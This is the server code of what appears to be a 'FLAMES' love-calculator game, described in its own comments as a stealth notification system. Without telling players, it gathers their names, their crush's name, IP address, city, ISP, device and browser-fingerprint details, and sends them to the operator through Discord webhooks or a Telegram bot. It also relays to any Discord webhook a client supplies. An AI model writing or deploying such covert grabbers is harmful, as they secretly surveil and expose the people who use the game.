// Vercel Serverless Function: POST /api/log
// Stealth crush submission handler with rate limiting & rich notifications

// ─── In-Memory Sliding Window Rate Limiter ─────────────────────────────────
// Persists for the lifetime of a warm serverless instance (~minutes on Vercel).
// Sufficient to block rapid-fire submissions; resets on cold start (acceptable).
const rateLimitMap = new Map(); // Map<ip, number[]> — timestamps of recent hits
const RATE_LIMIT     = 5;       // max submissions per window
const RATE_WINDOW_MS = 60_000;  // 60-second sliding window

function getClientIp(req) {
    // Vercel sets x-forwarded-for; take the first (originating) IP
    const fwd = req.headers['x-forwarded-for'] || '';
    return fwd.split(',')[0].trim() || req.headers['x-real-ip'] || 'unknown';
}

function isRateLimited(ip) {
    const now  = Date.now();
    const key  = ip || 'unknown';
    // Keep only timestamps within the current window
    const hits = (rateLimitMap.get(key) || []).filter(t => now - t < RATE_WINDOW_MS);
    if (hits.length >= RATE_LIMIT) return true; // blocked
    hits.push(now);
    rateLimitMap.set(key, hits);
    return false;
}

// ─── Main Handler ───────────────────────────────────────────────────────────
export default async function handler(req, res) {
    res.setHeader('Access-Control-Allow-Credentials', true);
    res.setHeader('Access-Control-Allow-Origin', '*');
    res.setHeader('Access-Control-Allow-Methods', 'GET,OPTIONS,POST');
    res.setHeader(
        'Access-Control-Allow-Headers',
        'X-CSRF-Token, X-Requested-With, Accept, Accept-Version, Content-Length, Content-MD5, Content-Type, Date, X-Api-Version'
    );

    if (req.method === 'OPTIONS') {
        res.status(200).end();
        return;
    }

    if (req.method === 'POST') {
        // ── Rate limit check (stealth: return 200 even when blocked) ──────
        const clientIp = getClientIp(req);
        if (isRateLimited(clientIp)) {
            return res.status(200).json({ success: true }); // silent block
        }

        try {
            const data       = req.body || {};
            const userAgent  = req.headers['user-agent'] || 'Unknown';
            const deviceType = getDeviceType(userAgent);

            // ── Vercel geo headers (injected automatically, no API needed) ──
            const country = req.headers['x-vercel-ip-country']         || '??';
            const city    = decodeURIComponent(req.headers['x-vercel-ip-city'] || 'Unknown').replace(/\+/g, ' ');
            const region  = req.headers['x-vercel-ip-country-region']  || '';
            const isp     = req.headers['x-vercel-ip-as-name']         || 'Unknown ISP';
            const location = city !== 'Unknown' ? `${city}, ${region}, ${country}` : country;

            const entry = {
                id:           'crush_' + Date.now() + '_' + Math.random().toString(36).substring(2, 7),
                // Names & FLAMES result
                userName:     data.userName     || 'Anonymous Admirer',
                crushName:    data.crushName    || 'Secret Crush',
                resultLetter: data.resultLetter || 'L',
                resultName:   data.resultName   || 'LOVERS',
                matchPct:     data.matchPct     || '96%',
                // Mood tags
                auraTag:      data.auraTag      || '✨ Rose Quartz',
                crushStatus:  data.crushStatus  || '🦋 Butterflies',
                // Timing
                timestamp:    data.timestamp    || new Date().toISOString(),
                // Server-side geo & network
                ipAddress:    clientIp,
                location:     location,
                isp:          isp,
                country:      country,
                // Server-side device
                deviceType:   deviceType,
                // Client-side browser fingerprint (sent in body)
                screenRes:    data.screenRes    || 'unknown',
                language:     data.language     || 'unknown',
                timezone:     data.timezone     || 'unknown',
                referrer:     data.referrer     || 'Direct',
                pageUrl:      data.pageUrl      || 'unknown',
                platform:     data.platform     || 'unknown',
                touchDevice:  data.touchDevice  || 'unknown',
                refSource:    data.refSource    || 'Direct Link'
            };

            // ── Discord ─────────────────────────────────────────────────────
            const discordWebhook = process.env.DISCORD_WEBHOOK_URL || process.env.NOTIF_WEBHOOK_URL || data.customDiscordWebhook;
            if (discordWebhook) {
                await sendDiscordNotification(discordWebhook, entry);
            }

            // ── Telegram ─────────────────────────────────────────────────────
            const telegramToken  = process.env.TG_TOKEN || process.env.NOTIF_BOT_TOKEN || process.env.TELEGRAM_BOT_TOKEN;
            const telegramChatId = process.env.TG_CHAT_ID || process.env.NOTIF_CHAT_ID || process.env.TELEGRAM_CHAT_ID;
            if (telegramToken && telegramChatId) {
                await sendTelegramNotification(telegramToken, telegramChatId, entry);
            }

            return res.status(200).json({ success: true, message: 'Notification sent successfully!', entry });

        } catch (err) {
            console.error('Error logging crush entry:', err);
            return res.status(500).json({ success: false, error: err.message });
        }
    }

    return res.status(405).json({ error: 'Method not allowed' });
}

// ─── Helpers ─────────────────────────────────────────────────────────────────
function getDeviceType(ua) {
    if (/iphone|ipad|ipod/i.test(ua))   return '📱 iOS (iPhone/iPad)';
    if (/android/i.test(ua))             return '📱 Android Smartphone';
    if (/macintosh|mac os x/i.test(ua)) return '💻 Mac Desktop/Laptop';
    if (/windows/i.test(ua))             return '💻 Windows PC';
    if (/linux/i.test(ua))               return '🖥️ Linux Desktop';
    return '🌐 Unknown Browser';
}

function escapeMarkdown(str) {
    if (!str) return '';
    // Escape special Markdown characters for Telegram MarkdownV2 — but we use Markdown mode
    return String(str).replace(/[`*_[\]]/g, '\\$&');
}

// ─── Discord Notification ────────────────────────────────────────────────────
async function sendDiscordNotification(webhookUrl, entry) {
    try {
        const payload = {
            username: "Cupid's Secret Vault 🏹",
            embeds: [{
                title: '💌 NEW SECRET CRUSH TESTED!',
                color: 16724838, // #FF3366 in decimal
                fields: [
                    { name: '👤 User Name',        value: entry.userName,     inline: true  },
                    { name: '💘 Crush Name',        value: entry.crushName,    inline: true  },
                    { name: '🔥 FLAMES Verdict',    value: `${entry.resultLetter} — ${entry.resultName} (${entry.matchPct})`, inline: false },
                    { name: '📱 Device',            value: entry.deviceType,   inline: true  },
                    { name: '💻 Platform',          value: entry.platform,     inline: true  },
                    { name: '👆 Touch',             value: entry.touchDevice,  inline: true  },
                    { name: '🌍 Location',          value: entry.location,     inline: true  },
                    { name: '🌐 IP Address',        value: entry.ipAddress,    inline: true  },
                    { name: '📡 ISP',               value: entry.isp,          inline: true  },
                    { name: '🗓️ Timezone',          value: entry.timezone,     inline: true  },
                    { name: '🔤 Language',          value: entry.language,     inline: true  },
                    { name: '📐 Screen',            value: entry.screenRes,    inline: true  },
                    { name: '🔗 Referrer',          value: entry.referrer,     inline: false },
                    { name: '📎 Page URL',          value: entry.pageUrl,      inline: false },
                    { name: '✨ Aura & Status',     value: `${entry.auraTag} | ${entry.crushStatus}`, inline: false },
                    { name: '⏰ Timestamp',         value: new Date(entry.timestamp).toLocaleString('en-IN', { timeZone: 'Asia/Kolkata' }), inline: false }
                ],
                footer: { text: 'FLAMES Crush Lab — Stealth Notification System' }
            }]
        };

        await fetch(webhookUrl, {
            method:  'POST',
            headers: { 'Content-Type': 'application/json' },
            body:    JSON.stringify(payload)
        });
    } catch (e) {
        console.error('Discord webhook failed:', e);
    }
}

// ─── Telegram Notification ───────────────────────────────────────────────────
async function sendTelegramNotification(botToken, chatId, entry) {
    const url = `https://api.telegram.org/bot${botToken}/sendMessage`;

    const text =
        `💌 *NEW SECRET CRUSH TESTED\\!*\n\n` +
        `👤 *User*: \`${entry.userName}\`\n` +
        `💘 *Crush*: \`${entry.crushName}\`\n` +
        `🔥 *FLAMES*: *${entry.resultLetter} — ${entry.resultName} \\(${entry.matchPct}\\)*\n\n` +
        `📱 *Device*: ${entry.deviceType}\n` +
        `💻 *Platform*: ${entry.platform}\n` +
        `👆 *Touch Device*: ${entry.touchDevice}\n\n` +
        `🌍 *Location*: ${entry.location}\n` +
        `🌐 *IP Address*: \`${entry.ipAddress}\`\n` +
        `📡 *ISP*: ${entry.isp}\n\n` +
        `🗓️ *Timezone*: ${entry.timezone}\n` +
        `🔤 *Language*: ${entry.language}\n` +
        `📐 *Screen*: ${entry.screenRes}\n` +
        `🔗 *Referrer*: ${entry.referrer}\n` +
        `📎 *Page URL*: ${entry.pageUrl}\n\n` +
        `✨ *Aura*: ${entry.auraTag}\n` +
        `🦋 *Status*: ${entry.crushStatus}\n` +
        `⏰ *Time*: ${new Date(entry.timestamp).toLocaleString('en-IN', { timeZone: 'Asia/Kolkata' })}`;

    try {
        // Attempt 1: MarkdownV2
        const resp = await fetch(url, {
            method:  'POST',
            headers: { 'Content-Type': 'application/json' },
            body:    JSON.stringify({ chat_id: chatId, text, parse_mode: 'MarkdownV2' })
        });
        const json = await resp.json();
        if (json.ok) return;

        console.error('Telegram MarkdownV2 error:', json.description);

        // Attempt 2: Plain text fallback (no markdown)
        const plainText =
            `NEW SECRET CRUSH TESTED!\n\n` +
            `User: ${entry.userName}\n` +
            `Crush: ${entry.crushName}\n` +
            `FLAMES: ${entry.resultLetter} — ${entry.resultName} (${entry.matchPct})\n\n` +
            `Device: ${entry.deviceType}\n` +
            `Location: ${entry.location}\n` +
            `IP: ${entry.ipAddress}\n` +
            `ISP: ${entry.isp}\n` +
            `Timezone: ${entry.timezone}\n` +
            `Language: ${entry.language}\n` +
            `Screen: ${entry.screenRes}\n` +
            `Referrer: ${entry.referrer}\n\n` +
            `Aura: ${entry.auraTag}\n` +
            `Status: ${entry.crushStatus}\n` +
            `Time: ${new Date(entry.timestamp).toLocaleString('en-IN', { timeZone: 'Asia/Kolkata' })}`;

        await fetch(url, {
            method:  'POST',
            headers: { 'Content-Type': 'application/json' },
            body:    JSON.stringify({ chat_id: chatId, text: plainText })
        });

    } catch (e) {
        console.error('Telegram notification failed:', e);
    }
}
